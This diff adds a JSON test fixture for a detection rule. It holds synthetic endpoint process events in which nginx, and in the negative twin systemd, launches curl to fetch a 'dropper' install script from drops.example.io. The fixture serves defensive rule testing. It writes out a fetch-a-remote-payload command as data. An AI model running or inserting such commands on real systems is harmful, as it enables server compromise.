@@ -1,0 +1,125 @@
+{
+  "rule": {
+    "source": "prebuilt",
+    "rule_id": "f16fca20-4d6c-43f9-aec1-20b6de3b0aeb"
+  },
+  "chain": "linux-curl",
+  "step": "nginx -> curl fetching the dropper",
+  "positive": {
+    "docs": [
+      {
+        "stream": "logs-endpoint.events.process",
+        "at": -120,
+        "doc": {
+          "event": {
+            "category": [
+              "process"
+            ],
+            "type": [
+              "start"
+            ],
+            "action": "exec",
+            "kind": "event"
+          },
+          "host": {
+            "name": "web-prod-07",
+            "id": "azqa-web-prod-07",
+            "os": {
+              "type": "linux",
+              "family": "debian"
+            },
+            "hostname": "web-prod-07"
+          },
+          "user": {
+            "name": "www-data",
+            "id": "33"
+          },
+          "process": {
+            "name": "curl",
+            "executable": "/usr/bin/curl",
+            "command_line": "curl -fsSL https://drops.example.io/install.sh",
+            "args": [
+              "curl",
+              "-fsSL",
+              "https://drops.example.io/install.sh"
+            ],
+            "args_count": 3,
+            "entity_id": "azqa-curl-001",
+            "working_directory": "/var/www/html",
+            "user": {
+              "id": "33"
+            },
+            "real_user": {
+              "id": "33"
+            },
+            "parent": {
+              "name": "nginx",
+              "executable": "/usr/sbin/nginx",
+              "entity_id": "azqa-nginx-001",
+              "command_line": "/usr/sbin/nginx"
+            }
+          }
+        }
+      }
+    ]
+  },
+  "negative": {
+    "twin_delta": "Same curl, but the parent is systemd, not a web server",
+    "docs": [
+      {
+        "stream": "logs-endpoint.events.process",
+        "at": -120,
+        "doc": {
+          "event": {
+            "category": [
+              "process"
+            ],
+            "type": [
+              "start"
+            ],
+            "action": "exec",
+            "kind": "event"
+          },
+          "host": {
+            "name": "web-prod-07",
+            "id": "azqa-web-prod-07",
+            "os": {
+              "type": "linux",
+              "family": "debian"
+            },
+            "hostname": "web-prod-07"
+          },
+          "user": {
+            "name": "www-data",
+            "id": "33"
+          },
+          "process": {
+            "name": "curl",
+            "executable": "/usr/bin/curl",
+            "command_line": "curl -fsSL https://drops.example.io/install.sh",
+            "args": [
+              "curl",
+              "-fsSL",
+              "https://drops.example.io/install.sh"
+            ],
+            "args_count": 3,
+            "entity_id": "azqa-curl-001",
+            "working_directory": "/",
+            "user": {
+              "id": "33"
+            },
+            "real_user": {
+              "id": "33"
+            },
+            "parent": {
+              "name": "systemd",
+              "executable": "/usr/lib/systemd/systemd",
+              "entity_id": "azqa-systemd-001",
+              "command_line": "/usr/lib/systemd/systemd"
+            }
+          }
+        }
+      }
+    ]
+  }
+}
